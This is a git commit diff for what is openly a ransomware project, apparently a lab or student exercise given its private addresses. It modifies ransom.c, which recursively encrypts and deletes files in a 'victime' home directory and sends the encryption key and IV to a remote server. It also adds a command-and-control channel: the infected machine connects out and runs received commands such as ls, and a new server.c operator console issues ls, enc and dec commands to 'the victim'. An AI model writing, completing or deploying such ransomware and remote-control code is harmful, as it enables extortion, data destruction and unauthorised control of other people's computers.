cd1ce6ecb57183b54156ec78edbc54bebb86bfae
Louis <louis.flamion@gmail.com>
2021-12-15 22:29:32 +0100

    ls remote implementation

--- ransom.c
+++ ransom.c
@@ -18,7 +18,55 @@ int send_key(char *pKey, char *pIv);
 
 int main (int argc, char * argv[])
 {
+    int sockid;
+    int server_port = 8888;
+    char *server_ip = "10.0.0.2";
+
+    sockid = socket(AF_INET, SOCK_STREAM,0);
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+
+    struct sockaddr_in client_addr;
+    client_addr.sin_family = AF_INET;
+    client_addr.sin_port = htons(5555);
+    client_addr.sin_addr.s_addr = inet_addr("10.0.0.1");
+
+    bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr));
+    connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
 	
+    char command[512];
+    while(1) 
+    {
+        recv(sockid, command, 512, 0);
+        
+
+        if(strncmp(command,"ls",2) == 0)   //Handle ls command
+        {
+            FILE *out_fp;
+            char buffer[1048];
+            char path[100000];
+
+            out_fp = popen("/bin/ls", "r");
+
+            fgets(buffer, sizeof(buffer), out_fp);      //put in path the result of ls command line by line
+            strcpy(path, buffer);
+
+            while (fgets(buffer, sizeof(buffer), out_fp) != NULL)
+            {
+                strcat(path, buffer);
+            }
+
+            printf("%s",path);
+            
+
+            send(sockid, (const char *)path, strlen(path),0); //send the whole result once
+        }
+        
+
+    }
 	unsigned char key[33];
     int sizeKey = 33;
     unsigned char iv[33];
@@ -26,8 +74,8 @@ int main (int argc, char * argv[])
     char pKey[65];
     char pIv[65];
 	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
-	listdir("/home/victime/important", iv, key, 'e');
-    send_key(pKey, pIv);
+	//listdir("/home/victime/important", iv, key, 'e');
+    //send_key(pKey, pIv);
 }
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
@@ -55,23 +103,26 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             //printf("%s\n", newPath);
             listdir(newPath,iv, key, 'e');
             free(newPath);
-            
-            
-            
         }
 
         else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
         {
-
             char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
             strcpy(filePath,name);
             strncat(filePath,"/",2);
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
             printf("%s\n",filePath);
-            encrypt(key, iv, filePath);
-            remove(filePath);
+            if (de_flag == 'e')
+            {
+                encrypt(key, iv, filePath);
+                remove(filePath);
+            }
+            else 
+            {
+                decrypt(key, iv, filePath);
+                remove(filePath);
+            }
             free(filePath);
-
         }
     }
 }
@@ -93,7 +144,7 @@ int send_key(char *pKey, char *pIv)
     strcat(msg,pIv);
 
     int status = connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
-    printf("%d\n", status);
+    
 
     send(sockid, (const char *)msg, strlen(msg),0);
     close(sockid);
---
+++ server.c
@@ -0,0 +1,92 @@
+#include <sys/socket.h>
+#include <unistd.h> 
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+void usage();
+int command_handler(char * command, int sockid, int client_socket);
+
+
+int main()
+{
+    int sockid;
+    int server_port = 8888;
+    char *server_ip = "10.0.0.2";
+
+    sockid = socket(AF_INET, SOCK_STREAM,0);
+
+    struct sockaddr_in server_addr, client_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+
+    int n, len, client_socket;
+    char buffer[2048];
+
+    bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr));
+    printf("Waiting for connection...\n");
+    n = listen(sockid,1);
+    len = sizeof(client_addr);
+    client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len);
+    printf("Connected to a victim\n");
+
+    
+
+    //n = recv(client_socket, (char *)buffer, 2048, MSG_WAITALL );
+    while (1) 
+    {
+        char command[512];
+        printf("h for help\n");
+        printf("$ ");
+        fgets(command,512,stdin);
+        command_handler(command, sockid, client_socket);
+
+    }   
+}
+
+
+void usage() 
+{
+    printf("h : prints help\n");
+    printf("ls : list every directories of the victim's home directory\n");
+    printf("enc <directory> : recursively encrypt a directory\n");
+    printf("dec <directory> <key> <iv> : recursively encrypt a directory\n");
+
+}
+
+int command_handler(char * command,int sockid, int client_socket)
+{
+    char buffer[512];
+    if (strncmp(command,"h",1) == 0)
+    {
+        usage();
+    }
+    else if(strncmp(command,"ls",2) == 0)
+    {   
+        
+        send(client_socket, (const char *)command, strlen(command),0);
+        recv(client_socket, (char *)buffer, 2048, 0 );
+        printf("%s\n", buffer);
+    }
+    else if (strncmp(command,"enc",3) == 0)
+    {
+        send(client_socket, (const char *)command, strlen(command),0);
+        recv(client_socket, (char *)buffer, 2048, 0);
+        printf("%s\n", buffer);
+    }
+    else if (strncmp(command,"dec",3) == 0)
+    {
+        send(client_socket, (const char *)command, strlen(command),0);
+        recv(client_socket, (char *)buffer, 2048, 0);
+        printf("%s\n", buffer);
+    }
+    else 
+    {
+        printf("command not found type h for help\n");
+    }
+
+}
+
